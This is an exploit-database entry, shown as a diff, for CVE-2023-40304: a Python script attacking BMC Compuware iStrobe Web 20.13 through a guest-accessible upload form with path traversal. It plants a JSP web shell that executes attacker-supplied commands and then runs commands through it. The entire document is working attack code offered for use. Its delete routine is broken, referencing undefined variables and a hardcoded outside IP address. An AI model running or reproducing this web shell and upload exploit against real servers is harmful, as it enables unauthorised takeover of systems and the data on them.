@@ -1,0 +1,82 @@
+id: 39558
+date: 04/15/2024
+title: BMC Compuware iStrobe Web - 20.13 - Pre-auth Remote Code Execution Exploit
+author: trancap
+cves: CVE-2023-40304
+
+#!/usr/bin/env python3
+
+# Exploit Title: Pre-auth RCE on Compuware iStrobe Web
+# Date: 01-08-2023
+# Exploit Author: trancap
+# Vendor Homepage: https://www.bmc.com/
+# Version: BMC Compuware iStrobe Web - 20.13
+# Tested on: zOS# CVE : CVE-2023-40304
+# To exploit this vulnerability you'll need "Guest access" enabled. The vulnerability is quite simple and impacts a web upload form, allowing a path traversal and an arbitrary file upload (.jsp files)
+# The vulnerable parameter of the form is "fileName". Using the form, one can upload a webshell (content of the webshell in the "topicText" parameter).# I contacted the vendor but he didn't consider this a vulnerability because of the Guest access needed.
+
+import requests
+import urllib.parse
+import argparse
+import sys
+
+def upload_web_shell(url):
+  data = {"fileName":"../jsp/userhelp/ws.jsp","author":"Guest","name":"test","action":"open","topicText":"<%@
+page import=\"java.lang.*,java.io.*,java.util.*\" %><%Process
+p=Runtime.getRuntime().exec(request.getParameter(\"cmd\"));BufferedReader
+stdInput = new BufferedReader(new
+InputStreamReader(p.getInputStream()));BufferedReader stdError = new
+BufferedReader(new InputStreamReader(p.getErrorStream()));String
+s=\"\";while((s=stdInput.readLine()) !=
+null){out.println(s);};s=\"\";while((s=stdError.readLine()) !=
+null){out.println(s);};%>","lang":"en","type":"MODULE","status":"PUB"}
+  # If encoded, the web shell will not be uploaded properly
+  data = urllib.parse.urlencode(data, safe='"*<>,=()/;{}!')
+
+  # Checking if web shell already uploaded
+  r = requests.get(f"{url}/istrobe/jsp/userhelp/ws.jsp", verify=False)
+  if r.status_code != 404:
+    return
+
+  r = requests.post(f"{url}/istrobe/userHelp/saveUserHelp", data=data,
+verify=False)
+
+  if r.status_code == 200:
+    print(f"[+] Successfully uploaded web shell, it should be
+accessible at {url}/istrobe/jsp/userhelp/ws.jsp")
+  else:
+    sys.exit("[-] Something went wrong while uploading the web shell")
+
+def delete_web_shell(url):
+  paramsPost = {"fileName":"../jsp/userhelp/ws.jsp","author":"Guest","name":"test","action":"delete","lang":"en","type":"MODULE","status":"PUB"}
+  response = session.post("http://220.4.147.38:6301/istrobe/userHelp/deleteUserHelp",
+data=paramsPost, headers=headers, cookies=cookies)
+
+  if r.status_code == 200:
+    print(f"[+] Successfully deleted web shell")
+  else:
+    sys.exit("[-] Something went wrong while deleting the web shell")
+
+def run_cmd(url, cmd):
+  data = f"cmd={cmd}"
+  r = requests.post(f"{url}/istrobe/jsp/userhelp/ws.jsp", data=data,
+verify=False)
+
+  if r.status_code == 200:
+    print(r.text)
+  else:
+    sys.exit(f'[-] Something went wrong while executing "{cmd}" command')
+
+parser = argparse.ArgumentParser(prog='exploit_cve_2023_40304.py', description='CVE-2023-40304 - Pre-auth file upload vulnerability + path traversal to achieve RCE')
+parser.add_argument('url', help='Vulnerable URL to target. Must be like http(s)://vuln.target')
+parser.add_argument('-c', '--cmd', help='Command to execute on the remote host (Defaults to "whoami")', default='whoami')
+parser.add_argument('--rm', help='Deletes the uploaded web shell', action='store_true')
+args = parser.parse_args()
+
+upload_web_shell(args.url)
+run_cmd(args.url, args.cmd)
+
+if args.rm:
+  delete_web_shell(args.url)
+
+#  0day.today [2024-04-21]  #
